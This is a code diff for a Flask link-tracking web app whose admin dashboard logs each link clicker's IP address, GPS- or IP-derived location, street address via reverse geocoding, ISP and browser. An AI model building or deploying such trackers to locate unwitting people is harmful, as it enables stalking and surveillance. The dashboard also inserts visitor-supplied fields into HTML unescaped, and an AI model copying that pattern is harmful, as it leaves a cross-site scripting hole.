-        cur = db.execute(query)
-        rows = cur.fetchall()
+        # Get comprehensive statistics
+        total_events = db.execute('SELECT COUNT(*) FROM events').fetchone()[0]
+        total_links = db.execute('SELECT COUNT(*) FROM links').fetchone()[0]
+        total_clicks = db.execute('SELECT SUM(click_count) FROM links').fetchone()[0] or 0
+        unique_ips = db.execute('SELECT COUNT(DISTINCT ip_address) FROM events').fetchone()[0]
+        unique_countries = db.execute('SELECT COUNT(DISTINCT country) FROM events WHERE country != "Unknown"').fetchone()[0]
         
-        print(f"[Events Page] Displaying {len(rows)} events from database")
+        # Get recent events (last 50)
+        events = db.execute('''SELECT * FROM events 
+                              ORDER BY id DESC LIMIT 50''').fetchall()
         
-        events_html = f'''
+        # Get top countries
+        top_countries = db.execute('''SELECT country, COUNT(*) as count 
+                                     FROM events 
+                                     WHERE country != "Unknown" 
+                                     GROUP BY country 
+                                     ORDER BY count DESC 
+                                     LIMIT 10''').fetchall()
+        
+        # Get top browsers
+        top_browsers = db.execute('''SELECT browser, COUNT(*) as count 
+                                    FROM events 
+                                    GROUP BY browser 
+                                    ORDER BY count DESC 
+                                    LIMIT 10''').fetchall()
+        
+        # Get performance stats
+        avg_response_time = db.execute('SELECT AVG(response_time_ms) FROM events WHERE response_time_ms > 0').fetchone()[0] or 0
+        
+        dashboard_html = f'''
         <!DOCTYPE html>
-        <html>
+        <html lang="en">
         <head>
-            <title>Location Events</title>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>📊 Admin Dashboard - URL Tracker</title>
             <style>
-                body {{ font-family: Arial, sans-serif; margin: 20px; }}
-                table {{ border-collapse: collapse; width: 100%; }}
-                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
-                th {{ background-color: #f2f2f2; }}
-                tr:nth-child(even) {{ background-color: #f9f9f9; }}
-                .refresh-btn {{ background-color: #4CAF50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 10px 0; display: inline-block; }}
-                .back-btn {{ background-color: #008CBA; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 10px 10px; display: inline-block; }}
-                .stats {{ background-color: #e7f3ff; padding: 10px; border-radius: 5px; margin: 10px 0; }}
-                .address {{ max-width: 200px; word-wrap: break-word; }}
+                * {{
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                }}
+                
+                body {{
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                    background: #f8f9fa;
+                    color: #333;
+                }}
+                
+                .header {{
+                    background: linear-gradient(135deg, #667eea, #764ba2);
+                    color: white;
+                    padding: 20px;
+                    text-align: center;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+                }}
+                
+                .container {{
+                    max-width: 1400px;
+                    margin: 0 auto;
+                    padding: 30px 20px;
+                }}
+                
+                .stats-grid {{
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 20px;
+                    margin-bottom: 40px;
+                }}
+                
+                .stat-card {{
+                    background: white;
+                    padding: 25px;
+                    border-radius: 15px;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+                    border-left: 5px solid #667eea;
+                    transition: transform 0.2s ease;
+                }}
+                
+                .stat-card:hover {{
+                    transform: translateY(-5px);
+                }}
+                
+                .stat-number {{
+                    font-size: 2.5rem;
+                    font-weight: bold;
+                    color: #667eea;
+                    margin-bottom: 5px;
+                }}
+                
+                .stat-label {{
+                    color: #666;
+                    font-size: 0.9rem;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                }}
+                
+                .section {{
+                    background: white;
+                    margin: 30px 0;
+                    border-radius: 15px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+                }}
+                
+                .section-header {{
+                    background: #667eea;
+                    color: white;
+                    padding: 20px;
+                    font-size: 1.3rem;
+                    font-weight: 600;
+                }}
+                
+                .table-container {{
+                    overflow-x: auto;
+                    max-height: 600px;
+                    overflow-y: auto;
+                }}
+                
+                table {{
+                    width: 100%;
+                    border-collapse: collapse;
+                }}
+                
+                th, td {{
+                    padding: 12px;
+                    text-align: left;
+                    border-bottom: 1px solid #e0e0e0;
+                    font-size: 0.9rem;
+                }}
+                
+                th {{
+                    background: #f8f9fa;
+                    font-weight: 600;
+                    position: sticky;
+                    top: 0;
+                }}
+                
+                tr:hover {{
+                    background: #f8f9fa;
+                }}
+                
+                .actions {{
+                    padding: 20px;
+                    text-align: center;
+                    background: #f8f9fa;
+                }}
+                
+                .btn {{
+                    background: #667eea;
+                    color: white;
+                    padding: 12px 24px;
+                    border: none;
+                    border-radius: 25px;
+                    text-decoration: none;
+                    margin: 0 10px;
+                    display: inline-block;
+                    transition: all 0.3s ease;
+                    cursor: pointer;
+                }}
+                
+                .btn:hover {{
+                    background: #5a6fd8;
+                    transform: translateY(-2px);
+                }}
+                
+                .btn.secondary {{
+                    background: #6c757d;
+                }}
+                
+                .btn.secondary:hover {{
+                    background: #5a6268;
+                }}
+                
+                .charts-grid {{
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+                    gap: 30px;
+                    margin: 30px 0;
+                }}
+                
+                .chart {{
+                    background: white;
+                    padding: 25px;
+                    border-radius: 15px;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+                }}
+                
+                .chart h3 {{
+                    margin-bottom: 20px;
+                    color: #333;
+                    border-bottom: 2px solid #667eea;
+                    padding-bottom: 10px;
+                }}
+                
+                .chart-item {{
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    padding: 8px 0;
+                    border-bottom: 1px solid #f0f0f0;
+                }}
+                
+                .chart-label {{
+                    flex: 1;
+                    font-weight: 500;
+                }}
+                
+                .chart-value {{
+                    background: #667eea;
+                    color: white;
+                    padding: 4px 12px;
+                    border-radius: 15px;
+                    font-size: 0.9rem;
+                    font-weight: 600;
+                }}
+                
+                .status-indicator {{
+                    display: inline-block;
+                    width: 10px;
+                    height: 10px;
+                    border-radius: 50%;
+                    margin-right: 8px;
+                }}
+                
+                .status-online {{
+                    background: #28a745;
+                }}
+                
+                .status-offline {{
+                    background: #dc3545;
+                }}
+                
+                .location-source {{
+                    padding: 4px 8px;
+                    border-radius: 10px;
+                    font-size: 0.8rem;
+                    font-weight: 600;
+                }}
+                
+                .source-gps {{
+                    background: #d4edda;
+                    color: #155724;
+                }}
+                
+                .source-ip {{
+                    background: #d1ecf1;
+                    color: #0c5460;
+                }}
+                
+                @media (max-width: 768px) {{
+                    .container {{
+                        padding: 20px 10px;
+                    }}
+                    
+                    .stats-grid {{
+                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                    }}
+                    
+                    .charts-grid {{
+                        grid-template-columns: 1fr;
+                    }}
+                }}
+                
+                .auto-refresh {{
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    background: rgba(255,255,255,0.9);
+                    padding: 10px 15px;
+                    border-radius: 25px;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+                    font-size: 0.9rem;
+                    color: #28a745;
+                }}
             </style>
             <script>
-                function refreshPage() {{
-                    location.reload();
+                // Auto-refresh every 60 seconds
+                setTimeout(() => location.reload(), 60000);
+                
+                function exportData() {{
+                    window.open('/admin/export', '_blank');
                 }}
-                setInterval(refreshPage, 30000); // Auto-refresh every 30 seconds
             </script>
         </head>
         <body>
-            <h1>Location Events Dashboard</h1>
-            <div class="stats">
-                <strong>Total Events:</strong> {total_events} | 
-                <strong>Last Updated:</strong> {datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")} UTC |
-                <span style="color: green;">● Auto-refreshing every 30 seconds</span>
+            <div class="auto-refresh">
+                🔄 Auto-refresh: 60s
             </div>
             
-            <a href="/events" class="refresh-btn">🔄 Refresh Now</a>
-            <a href="/" class="back-btn">🏠 Back to Home</a>
+            <div class="header">
+                <h1>📊 Lightning URL Tracker Dashboard</h1>
+                <p>Comprehensive analytics and visitor tracking</p>
+            </div>
             
-            <table>
-                <tr>
-                    <th>IP Address</th>
-                    <th>City</th>
-                    <th>Region</th>
-                    <th>Country</th>
-                    <th>Latitude</th>
-                    <th>Longitude</th>
+            <div class="container">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">{total_events}</div>
+                        <div class="stat-label">Total Events</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{total_links}</div>
+                        <div class="stat-label">Links Created</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{total_clicks}</div>
+                        <div class="stat-label">Total Clicks</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{unique_ips}</div>
+                        <div class="stat-label">Unique Visitors</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{unique_countries}</div>
+                        <div class="stat-label">Countries</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{avg_response_time:.0f}ms</div>
+                        <div class="stat-label">Avg Response Time</div>
+                    </div>
+                </div>
+                
+                <div class="charts-grid">
+                    <div class="chart">
+                        <h3>🌍 Top Countries</h3>
         '''
         
-        if 'source' in columns:
-            events_html += '<th>Location Source</th>'
-        if 'address' in columns:
-            events_html += '<th>Address</th>'
-        
-        events_html += '<th>Timestamp (UTC)</th></tr>'
-        
-        if rows:
-            for row in rows:
-                if len(row) >= 8 and 'address' in columns and 'source' in columns:
-                    ip, city, region, country, lat, lng, source, address, timestamp = row
-                elif len(row) >= 7 and 'source' in columns:
-                    ip, city, region, country, lat, lng, source, timestamp = row
-                    address = 'N/A'
-                else:
-                    ip, city, region, country, lat, lng, timestamp = row
-                    source = 'unknown'
-                    address = 'N/A'
-                
-                source_display = {
-                    'browser': '📱 Browser GPS',
-                    'ip_fallback': '🌐 IP Geolocation',
-                    'unknown': '❓ Unknown'
-                }.get(source, source)
-                
-                events_html += f'''
-                <tr>
-                    <td>{ip}</td>
-                    <td>{city}</td>
-                    <td>{region}</td>
-                    <td>{country}</td>
-                    <td>{lat}</td>
-                    <td>{lng}</td>
-                '''
-                
-                if 'source' in columns:
-                    events_html += f'<td>{source_display}</td>'
-                if 'address' in columns:
-                    events_html += f'<td class="address">{address}</td>'
-                
-                events_html += f'<td>{timestamp}</td></tr>'
-        else:
-            colspan = 7 + ('source' in columns) + ('address' in columns)
-            events_html += f'''
-            <tr>
-                <td colspan="{colspan}" style="text-align: center; padding: 20px; color: #666;">
-                    No location events recorded yet. Click a shareable link to generate data!
-                </td>
-            </tr>
+        for country, count in top_countries:
+            dashboard_html += f'''
+                        <div class="chart-item">
+                            <div class="chart-label">{country}</div>
+                            <div class="chart-value">{count}</div>
+                        </div>
             '''
         
-        events_html += '''
-            </table>
+        dashboard_html += '''
+                    </div>
+                    
+                    <div class="chart">
+                        <h3>🌐 Top Browsers</h3>
+        '''
+        
+        for browser, count in top_browsers:
+            dashboard_html += f'''
+                        <div class="chart-item">
+                            <div class="chart-label">{browser}</div>
+                            <div class="chart-value">{count}</div>
+                        </div>
+            '''
+        
+        dashboard_html += '''
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <div class="section-header">
+                        📊 Recent Events (Last 50)
+                    </div>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>IP Address</th>
+                                    <th>Location</th>
+                                    <th>Device/Browser</th>
+                                    <th>Location Source</th>
+                                    <th>Response Time</th>
+                                    <th>Timestamp</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+        '''
+        
+        for event in events:
+            location_display = f"{event['city']}, {event['country']}" if event['city'] != 'Unknown' else event['country']
+            device_display = f"{event['browser']} on {event['os']}"
             
-            <br>
-            <div style="margin-top: 20px; padding: 10px; background-color: #f0f0f0; border-radius: 5px;">
-                <h3>How it works:</h3>
-                <ul>
-                    <li><strong>📱 Browser GPS:</strong> Precise location from user's device (requires permission)</li>
-                    <li><strong>🌐 IP Geolocation:</strong> Approximate location based on IP address (fallback)</li>
-                </ul>
+            source_class = 'source-gps' if event['location_source'] == 'browser_gps' else 'source-ip'
+            source_icon = '📱' if event['location_source'] == 'browser_gps' else '🌐'
+            source_text = 'GPS' if event['location_source'] == 'browser_gps' else 'IP'
+            
+            response_time = f"{event['response_time_ms']}ms" if event['response_time_ms'] else 'N/A'
+            
+            timestamp = datetime.fromisoformat(event['timestamp']).strftime('%Y-%m-%d %H:%M:%S') if event['timestamp'] else 'N/A'
+            
+            dashboard_html += f'''
+                                <tr>
+                                    <td>{event['ip_address']}</td>
+                                    <td>{location_display}</td>
+                                    <td>{device_display}</td>
+                                    <td><span class="location-source {source_class}">{source_icon} {source_text}</span></td>
+                                    <td>{response_time}</td>
+                                    <td>{timestamp}</td>
+                                </tr>
+            '''
+        
+        dashboard_html += f'''
+                            </tbody>
+                        </table>
+                    </div>
+                    <div class="actions">
+                        <button onclick="exportData()" class="btn">📥 Export Data</button>
+                        <a href="/admin/detailed" class="btn">🔍 Detailed View</a>
+                        <a href="/logout" class="btn secondary">🚪 Logout</a>
+                        <a href="/" class="btn secondary">🏠 Home</a>
+                    </div>
+                </div>
             </div>
         </body>
         </html>
         '''
         
-        return events_html
+        return dashboard_html
         
     except Exception as e:
-        error_msg = f"<h2>Error accessing database</h2><p>{e}</p><br><a href='/'>Back to Home</a>"
-        print(f"[Events Page Error] {e}")
-        return error_msg
+        return f"<h2>Dashboard Error</h2><p>{e}</p><br><a href='/logout'>Logout</a>"
 
 def get_ip_geolocation(ip):
-    """Get geolocation from IP using multiple APIs for better reliability"""
-    
-    # Handle localhost/private IPs
-    if ip in ['127.0.0.1', 'localhost'] or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
-        print(f"[IP Geolocation] Localhost/Private IP detected: {ip}, using demo location")
+    """Enhanced IP geolocation with multiple data points"""
+    if ip in ['127.0.0.1', 'localhost'] or ip.startswith(('192.168.', '10.', '172.')):
         return {
-            'city': 'Demo City',
-            'region_name': 'Demo Region', 
-            'country_name': 'Demo Country',
-            'latitude': '40.7128',
-            'longitude': '-74.0060'
+            'city': 'Local Network',
+            'region_name': 'Private Network', 
+            'country_name': 'Local',
+            'latitude': '0',
+            'longitude': '0',
+            'timezone': 'Local',
+            'isp': 'Local ISP',
+            'org': 'Private Network'
         }
     
     apis = [
-        # Primary API
         {
-            'url': f'https://reallyfreegeoip.org/json/{ip}',
-            'city_key': 'city',
-            'region_key': 'region_name',
-            'country_key': 'country_name',
-            'lat_key': 'latitude',
-            'lng_key': 'longitude'
-        },
-        # Backup API 1
-        {
-            'url': f'http://ip-api.com/json/{ip}',
+            'url': f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org',
             'city_key': 'city',
             'region_key': 'regionName',
             'country_key': 'country',
             'lat_key': 'lat',
-            'lng_key': 'lon'
-        },
-        # Backup API 2  
-        {
-            'url': f'https://ipapi.co/{ip}/json/',
-            'city_key': 'city',
-            'region_key': 'region',
-            'country_key': 'country_name',
-            'lat_key': 'latitude',
-            'lng_key': 'longitude'
+            'lng_key': 'lon',
+            'timezone_key': 'timezone',
+            'isp_key': 'isp',
+            'org_key': 'org'
         }
     ]
     
-    for i, api in enumerate(apis):
+    for api in apis:
         try:
-            print(f"[IP Geolocation] Trying API {i+1}: {api['url']}")
             response = requests.get(api['url'], timeout=5)
             data = response.json()
             
-            city = data.get(api['city_key'], 'Unknown')
-            region = data.get(api['region_key'], 'Unknown')
-            country = data.get(api['country_key'], 'Unknown')
-            lat = data.get(api['lat_key'], 'Unknown')
-            lng = data.get(api['lng_key'], 'Unknown')
-            
-            # Check if we got valid data
-            if city and city != 'Unknown' and lat and lat != 'Unknown':
-                print(f"[IP Geolocation] Success with API {i+1}: {city}, {region}, {country}")
+            if data.get('status') == 'success':
                 return {
-                    'city': city,
-                    'region_name': region,
-                    'country_name': country,
-                    'latitude': str(lat),
-                    'longitude': str(lng)
+                    'city': data.get(api['city_key'], 'Unknown'),
+                    'region_name': data.get(api['region_key'], 'Unknown'),
+                    'country_name': data.get(api['country_key'], 'Unknown'),
+                    'latitude': str(data.get(api['lat_key'], 'Unknown')),
+                    'longitude': str(data.get(api['lng_key'], 'Unknown')),
+                    'timezone': data.get(api['timezone_key'], 'Unknown'),
+                    'isp': data.get(api['isp_key'], 'Unknown'),
+                    'org': data.get(api['org_key'], 'Unknown')
                 }
-                
         except Exception as e:
-            print(f"[IP Geolocation] API {i+1} failed: {e}")
+            print(f"Geolocation API error: {e}")
             continue
     
-    # All APIs failed
-    print("[IP Geolocation] All APIs failed, using fallback")
     return {
         'city': 'Unknown',
         'region_name': 'Unknown',
         'country_name': 'Unknown',
         'latitude': 'Unknown',
-        'longitude': 'Unknown'
+        'longitude': 'Unknown',
+        'timezone': 'Unknown',
+        'isp': 'Unknown',
+        'org': 'Unknown'
     }
 
 def get_address_from_coords(lat, lng):
-    """Get address from coordinates using reverse geocoding"""
+    """Get address from coordinates"""
     try:
-        # Using OpenStreetMap Nominatim (free)
-        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&addressdetails=1"
-        headers = {'User-Agent': 'ShareableLinkTracker/1.0'}
+        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18"
+        headers = {'User-Agent': 'LightningURLTracker/2.0'}
         response = requests.get(url, headers=headers, timeout=5)
         data = response.json()
-        
-        if 'display_name' in data:
-            return data['display_name']
-        else:
-            return "Address not found"
-            
-    except Exception as e:
-        print(f"[Reverse Geocoding] Error: {e}")
-        return "Address unavailable"
+        return data.get('display_name', 'Address not found')
+    except:
+        return 'Address unavailable'
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=app.config['DEBUG']) 
+    app.run(host='0.0.0.0', port=port) 
